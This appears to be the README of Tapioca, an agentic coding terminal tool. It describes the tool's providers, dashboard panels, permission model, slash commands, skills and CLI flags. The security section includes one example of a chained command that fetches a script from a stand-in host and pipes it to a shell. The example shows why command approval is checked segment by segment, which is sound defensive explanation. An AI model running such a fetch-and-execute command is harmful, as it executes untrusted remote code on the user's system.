# Tapioca

An agentic coding TUI: a model that reads, writes and runs things in your
project, with every mutating call behind a permission prompt — and the state of
the session on screen while it works.

![Tapioca fixing operator precedence in a parser](assets/demo.gif)

**[Documentation →](https://juacamole.github.io/tapioca-docs/guide/what-is-tapioca)**

```sh
go build -o tapioca .   # or: nix run .
tapioca                 # in any project directory
```

It also installs as **`tapio`**, because Shopify's `tapioca` gem claims the same
name and whichever is later on your PATH wins. Both are the same program:
`go build -o tapio ./cmd/tapio`, or `nix build .` for both at once.

With [Ollama](https://ollama.com) running it works out of the box — no key, no
account, no network beyond localhost. Anthropic, Bedrock, Vertex AI, Azure
OpenAI, Gemini and any OpenAI-compatible server also work; switching is one
`/model`. Needs Go 1.26.5+ to build.

Linux, macOS and Windows. The shell tools expect a POSIX `sh`, so on Windows
install Git for Windows or WSL — `cmd.exe` is a fallback and most commands the
model writes will not run there.

## What it does differently

**The session's cost is on screen, not behind a command.** Context fill,
spend, the agent's plan, recent tool calls with their arguments, git status and
changed files stay visible while the agent streams. The panels are
configuration — pick them with `/panels`, dock them on any side, edit settings
in place and have every change written back to your config file, comments
intact.

**A threat model, not a permission prompt.** [SECURITY.md](SECURITY.md) says
what is enforced *and what is not*. Deny rules hold in every mode including
`bypass`; compound commands are approved segment by segment, so an allow rule
for `go test*` can't be ridden in on by `go test ./... && curl evil.sh | sh`;
`read_file` gates secrets even though it never otherwise prompts; provider keys
are scrubbed from every subprocess. With `sandbox = true`, bash runs under
bubblewrap with `$HOME` replaced by an empty tmpfs — `.ssh` isn't gated, it's
absent.

**Agents that actually run at once.** Each has its own provider, model, prompt,
history and stats, streaming in its own goroutine. `/fork` branches a
conversation without losing the original, and `spawn_agent` delegates work to a
subagent whose noise never reaches your context window.

**It respects the terminal.** Drag to select and it copies on release — no copy
mode, no prefix key. `ascii` glyphs render in any terminal and font, borders
included; `mono` drops color entirely; `contrast` is colorblind-safe Okabe-Ito.
Default keybinds avoid `alt`, so they work on macOS.

**Safety nets for real work.** Edit a file in your own editor and the agent's
stale writes are refused until it re-reads. Everything it writes is checked by
your language servers, with errors attached to the tool result so they're fixed
in the same turn. `/rewind` restores the worktree from a checkpoint.

**One binary.** `tapioca --acp` speaks the
[Agent Client Protocol](https://agentclientprotocol.com), so Zed and other ACP
editors drive the same build. It reads `AGENTS.md`, `CLAUDE.md`, `GEMINI.md`
and `CRUSH.md`, so instructions written for other tools work unchanged.

## Slash commands

| | |
|---|---|
| `/help` | keybinds and commands |
| `/model [provider:]name` | switch model (no argument opens a picker) |
| `/connect` | connect a provider or account |
| `/effort [level]` | thinking effort (no argument opens a picker) |
| `/thinking` | toggle thinking |
| `/tools` | toggle tools for this agent |
| `/agent [name]` | new agent |
| `/fork` | fork this conversation into a new agent |
| `/goal text \| clear` | set a session goal |
| `/btw note` | add context without asking for a reply |
| `/remember fact \| clear` | persist a project fact |
| `/skills [name]` | list capability packs; a name loads one now |
| `/systemprompt` | edit the system prompt |
| `/regen` | regenerate the last response |
| `/edit` | pull the last prompt back into the input |
| `/compact` | summarize the conversation to free context |
| `/clear` | clear this agent's conversation |
| `/cd dir` | change the working directory |
| `/diff` | git diff of the working directory |
| `/log` | recent messages and errors |
| `/permissions` | what runs without approval |
| `/checkpoints` | pick a checkpoint to rewind to |
| `/rewind [n\|id]` | rewind file changes |
| `/new` | fresh session |
| `/save` | save the session |
| `/resume [id]` | resume a saved session |
| `/settings` | edit the config file; reloads on save |
| `/panels` | choose and order dashboard panels |
| `/theme [name]` | color theme |
| `/glyphs [name]` | `unicode`, `ascii` or `nerd` |
| `/wordmark [mode]` | welcome mark: `auto`, `compact`, `text` or `off` |
| `/verbose` | full thoughts and tool output in chat |
| `/zen` | hide keybind hints |
| `/quit` | save and exit |

Drop a markdown file in `~/.config/tapioca/commands/` or `.tapioca/commands/`
and its name becomes a command of your own.

### Skills

A command is a macro you fire; a skill is a capability the model reaches for. A
`SKILL.md` in `~/.config/tapioca/skills/<name>/` or `.tapioca/skills/<name>/`
declares a name and a description, and only those are in context — one line
each. When the model judges one relevant it calls `load_skill`, which brings in
the instructions and whatever files are bundled beside them, so a checklist or a
script travels with the skill. `/skills` lists what is installed and what this
conversation has loaded.

```
.tapioca/skills/release/
  SKILL.md        # --- name / description --- then the instructions
  checklist.md    # loaded only once the skill is engaged
  verify.sh
```

### Newlines in the prompt

`shift+enter` inserts a line break, and `ctrl+j` does the same in terminals
without support for keyboard enhancements.

## CLI

```sh
tapioca -c                          # continue the most recent session
tapioca -r [id]                     # resume (no id opens a picker)
tapioca -p "fix the failing test"   # headless: one prompt, print, exit
tapioca --permission-mode plan      # plan | manual | auto | bypass
tapioca --sandbox                   # confine bash with bubblewrap
tapioca --acp                       # serve ACP on stdio, for editors
```

Full flag list, configuration and keybinds are in the
[documentation](https://juacamole.github.io/tapioca-docs/reference/cli).

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md). Security issues: please read
[SECURITY.md](SECURITY.md) first — it documents the threat model and how to
report privately.

MIT licensed.
